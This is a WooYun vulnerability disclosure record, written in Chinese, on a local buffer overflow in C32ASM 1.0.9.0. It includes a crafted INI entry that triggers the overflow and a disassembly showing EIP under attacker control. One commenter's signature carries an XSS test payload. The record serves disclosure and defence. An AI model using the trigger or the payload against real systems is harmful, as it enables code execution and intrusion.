{"id": 57794, "wybug_id": "wooyun-2014-053293", "wybug_title": "C32ASM缓冲区溢出漏洞", "wybug_corp": "C32ASM", "wybug_author": "光刃", "wybug_date": "2014-03-10 17:03", "wybug_open_date": "2014-06-08 17:04", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["缓冲区溢出"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-05-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-08：\t细节向公众公开  简要描述： 实验版本：1.0.9.0（该漏洞可能涉及该软件的所有版本）在处理C32ASM.INI文件时候设计缺陷，存在缓冲区溢出漏洞。EIP可控 详细说明：  漏洞触发：在ini文件中找到  “[HEXEDITRECENTFILES]”在下面添加如下内容\nFILE0=C:\\Documents and Settings\\windows\\桌面\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\.AAAAAAAA\n然后运行程序-选择文件-打开最近的十六进制文件-选择我们上述定义的文件这时候出现This File is Empty，Are you want open continue？点击确认就崩溃了代码简要分析：004DCDC0  |.  8B8E 0C010000 mov     ecx, dword ptr [esi+10C]         ;  溢出，ECX可控（我们输入的内容）004DCDC6  |.  3BCB          cmp     ecx, ebx004DCDC8  |.  74 0F         je      short 004DCDD9004DCDCA  |>  8B01          /mov     eax, dword ptr [ecx]            ;  EAX可控004DCDCC  |.  8B79 10       |mov     edi, dword ptr [ecx+10]         ;  EDI可控004DCDCF  |.  6A 01         |push    1004DCDD1  |.  FF10          |call    dword ptr [eax]                 ;  EIP可控004DCDD3  |.  3BFB          |cmp     edi, ebx004DCDD5  |.  8BCF          |mov     ecx, edi004DCDD7  |.^ 75 F1         \\jnz     short 004DCDCA   漏洞证明：  崩溃图 \n\n崩溃原理\n\n   修复方案：  检测大小   版权声明：转载请注明来源 光刃@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-03-15 20:39 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-10 21:30 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @光刃 请问这些本地溢出有什么危害？求远程溢出！    \n     2014-03-11 01:40 |    \t\t默小文 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | \"><img src=x onerror=alert(1);> <img src...)\t\t \n  @U神 本地溢出 结合社会工程学   ..  高质量的远程溢出    \n     2014-04-12 18:19 |    \t\t雷锋 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 承接:钻井，架工，木工，电工，水暖工，力...)\t\t \n  专业溢出20年。。。    \n     2015-01-23 00:09 |    \t\tzzzzy \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 熟练各种语言名称的拼写)\t\t \n  光刃大侠提权肯定牛的一比...    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}